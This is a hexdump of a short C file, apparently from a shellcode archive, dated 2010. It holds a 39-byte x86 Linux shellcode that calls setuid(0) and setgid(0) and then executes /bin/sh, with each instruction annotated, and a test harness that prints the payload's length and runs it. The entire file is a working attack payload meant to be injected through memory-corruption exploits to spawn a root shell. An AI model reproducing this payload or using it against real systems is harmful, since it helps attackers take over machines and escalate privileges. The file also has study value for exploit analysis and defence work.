00000000  2f 2a 0a 4e 61 6d 65 20  20 20 3a 20 33 39 20 62  |/*.Name   : 39 b|
00000010  79 74 65 73 20 73 79 73  5f 73 65 74 75 69 64 28  |ytes sys_setuid(|
00000020  30 29 20 26 20 73 79 73  5f 73 65 74 67 69 64 28  |0) & sys_setgid(|
00000030  30 29 20 26 20 65 78 65  63 76 65 20 28 22 2f 62  |0) & execve ("/b|
00000040  69 6e 2f 73 68 22 29 20  78 38 36 20 6c 69 6e 75  |in/sh") x86 linu|
00000050  78 20 73 68 65 6c 6c 63  6f 64 65 0a 44 61 74 65  |x shellcode.Date|
00000060  20 20 20 3a 20 54 75 65  20 4a 75 6e 20 20 31 20  |   : Tue Jun  1 |
00000070  32 31 3a 32 39 3a 31 30  20 32 30 31 30 0a 41 75  |21:29:10 2010.Au|
00000080  74 68 6f 72 20 3a 20 67  75 6e 73 6c 69 6e 67 65  |thor : gunslinge|
00000090  72 5f 20 3c 79 75 64 68  61 2e 67 75 6e 73 6c 69  |r_ <yudha.gunsli|
000000a0  6e 67 65 72 5b 61 74 5d  67 6d 61 69 6c 2e 63 6f  |nger[at]gmail.co|
000000b0  6d 3e 0a 57 65 62 20 20  20 20 3a 20 68 74 74 70  |m>.Web    : http|
000000c0  3a 2f 2f 64 65 76 69 6c  7a 63 30 64 65 2e 6f 72  |://devilzc0de.or|
000000d0  67 0a 62 6c 6f 67 20 20  20 3a 20 68 74 74 70 3a  |g.blog   : http:|
000000e0  2f 2f 67 75 6e 73 6c 69  6e 67 65 72 63 30 64 65  |//gunslingerc0de|
000000f0  2e 77 6f 72 64 70 72 65  73 73 2e 63 6f 6d 0a 74  |.wordpress.com.t|
00000100  65 73 74 65 64 20 6f 6e  20 3a 20 6c 69 6e 75 78  |ested on : linux|
00000110  20 64 65 62 69 61 6e 0a  2a 2f 0a 23 69 6e 63 6c  | debian.*/.#incl|
00000120  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0a 0a 63  |ude <stdio.h>..c|
00000130  68 61 72 20 2a 73 68 65  6c 6c 63 6f 64 65 3d 0a  |har *shellcode=.|
00000140  09 09 22 5c 78 65 62 5c  78 31 39 22 20 20 20 20  |.."\xeb\x19"    |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000160  2f 2a 20 6a 6d 70 20 20  20 20 30 78 38 30 34 38  |/* jmp    0x8048|
00000170  30 37 62 20 2a 2f 0a 09  09 22 5c 78 33 31 5c 78  |07b */..."\x31\x|
00000180  63 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0"             |
00000190  20 20 20 20 20 20 20 2f  2a 20 78 6f 72 20 20 20  |       /* xor   |
000001a0  20 25 65 61 78 2c 25 65  61 78 20 2a 2f 0a 09 09  | %eax,%eax */...|
000001b0  22 5c 78 62 30 5c 78 31  37 22 20 20 20 20 20 20  |"\xb0\x17"      |
000001c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
000001d0  20 6d 6f 76 20 20 20 20  24 30 78 31 37 2c 25 61  | mov    $0x17,%a|
000001e0  6c 20 2a 2f 0a 09 09 22  5c 78 33 31 5c 78 64 62  |l */..."\x31\xdb|
000001f0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000200  20 20 20 20 20 2f 2a 20  78 6f 72 20 20 20 20 25  |     /* xor    %|
00000210  65 62 78 2c 25 65 62 78  20 2a 2f 0a 09 09 22 5c  |ebx,%ebx */..."\|
00000220  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 20 20  |xcd\x80"        |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 69  |            /* i|
00000240  6e 74 20 20 20 20 24 30  78 38 30 20 2a 2f 0a 09  |nt    $0x80 */..|
00000250  09 22 5c 78 33 31 5c 78  63 30 22 20 20 20 20 20  |."\x31\xc0"     |
00000260  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000270  2a 20 78 6f 72 20 20 20  20 25 65 61 78 2c 25 65  |* xor    %eax,%e|
00000280  61 78 20 2a 2f 0a 09 09  22 5c 78 62 30 5c 78 32  |ax */..."\xb0\x2|
00000290  65 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e"              |
000002a0  20 20 20 20 20 20 2f 2a  20 6d 6f 76 20 20 20 20  |      /* mov    |
000002b0  24 30 78 32 65 2c 25 61  6c 20 2a 2f 0a 09 09 22  |$0x2e,%al */..."|
000002c0  5c 78 33 31 5c 78 64 62  22 20 20 20 20 20 20 20  |\x31\xdb"       |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
000002e0  78 6f 72 20 20 20 20 25  65 62 78 2c 25 65 62 78  |xor    %ebx,%ebx|
000002f0  20 2a 2f 0a 09 09 22 5c  78 63 64 5c 78 38 30 22  | */..."\xcd\x80"|
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000310  20 20 20 20 2f 2a 20 69  6e 74 20 20 20 20 24 30  |    /* int    $0|
00000320  78 38 30 20 2a 2f 0a 09  09 22 5c 78 33 31 5c 78  |x80 */..."\x31\x|
00000330  63 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0"             |
00000340  20 20 20 20 20 20 20 2f  2a 20 78 6f 72 20 20 20  |       /* xor   |
00000350  20 25 65 61 78 2c 25 65  61 78 20 2a 2f 0a 09 09  | %eax,%eax */...|
00000360  22 5c 78 62 30 5c 78 30  62 22 20 20 20 20 20 20  |"\xb0\x0b"      |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000380  20 6d 6f 76 20 20 20 20  24 30 78 62 2c 25 61 6c  | mov    $0xb,%al|
00000390  20 2a 2f 0a 09 09 22 5c  78 35 62 22 20 20 20 20  | */..."\x5b"    |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003b0  20 20 20 20 2f 2a 20 70  6f 70 20 20 20 20 25 65  |    /* pop    %e|
000003c0  62 78 20 2a 2f 0a 09 09  22 5c 78 38 39 5c 78 64  |bx */..."\x89\xd|
000003d0  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
000003e0  20 20 20 20 20 20 2f 2a  20 6d 6f 76 20 20 20 20  |      /* mov    |
000003f0  25 65 64 78 2c 25 65 63  78 20 2a 2f 0a 09 09 22  |%edx,%ecx */..."|
00000400  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
00000420  69 6e 74 20 20 20 20 24  30 78 38 30 20 2a 2f 0a  |int    $0x80 */.|
00000430  09 09 22 5c 78 65 38 5c  78 65 32 5c 78 66 66 5c  |.."\xe8\xe2\xff\|
00000440  78 66 66 5c 78 66 66 22  20 20 20 20 20 20 20 20  |xff\xff"        |
00000450  2f 2a 20 63 61 6c 6c 20  20 20 30 78 38 30 34 38  |/* call   0x8048|
00000460  30 36 32 20 2a 2f 0a 09  09 22 5c 78 32 66 22 20  |062 */..."\x2f" |
00000470  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000480  20 20 20 20 20 20 20 2f  2a 20 64 61 73 20 20 20  |       /* das   |
00000490  20 20 2a 2f 0a 09 09 22  5c 78 36 32 5c 78 36 39  |  */..."\x62\x69|
000004a0  5c 78 36 65 22 20 20 20  20 20 20 20 20 20 20 20  |\x6e"           |
000004b0  20 20 20 20 20 2f 2a 20  62 6f 75 6e 64 20 20 25  |     /* bound  %|
000004c0  65 62 70 2c 30 78 36 65  28 25 65 63 78 29 20 2a  |ebp,0x6e(%ecx) *|
000004d0  2f 0a 09 09 22 5c 78 32  66 22 20 20 20 20 20 20  |/..."\x2f"      |
000004e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004f0  20 20 2f 2a 20 64 61 73  20 20 20 20 20 2a 2f 0a  |  /* das     */.|
00000500  09 09 22 5c 78 37 33 5c  78 36 38 22 20 20 20 20  |.."\x73\x68"    |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000520  2f 2a 20 6a 61 65 20 20  20 20 30 78 38 30 34 38  |/* jae    0x8048|
00000530  30 65 66 20 2a 2f 0a 09  09 22 22 3b 0a 0a 69 6e  |0ef */..."";..in|
00000540  74 20 6d 61 69 6e 28 76  6f 69 64 29 0a 7b 0a 09  |t main(void).{..|
00000550  09 66 70 72 69 6e 74 66  28 73 74 64 6f 75 74 2c  |.fprintf(stdout,|
00000560  22 4c 65 6e 67 74 68 3a  20 25 64 5c 6e 22 2c 73  |"Length: %d\n",s|
00000570  74 72 6c 65 6e 28 73 68  65 6c 6c 63 6f 64 65 29  |trlen(shellcode)|
00000580  29 3b 0a 09 09 28 28 76  6f 69 64 20 28 2a 29 28  |);...((void (*)(|
00000590  76 6f 69 64 29 29 20 73  68 65 6c 6c 63 6f 64 65  |void)) shellcode|
000005a0  29 28 29 3b 0a 09 09 72  65 74 75 72 6e 20 30 3b  |)();...return 0;|
000005b0  0a 7d                                             |.}|
000005b2
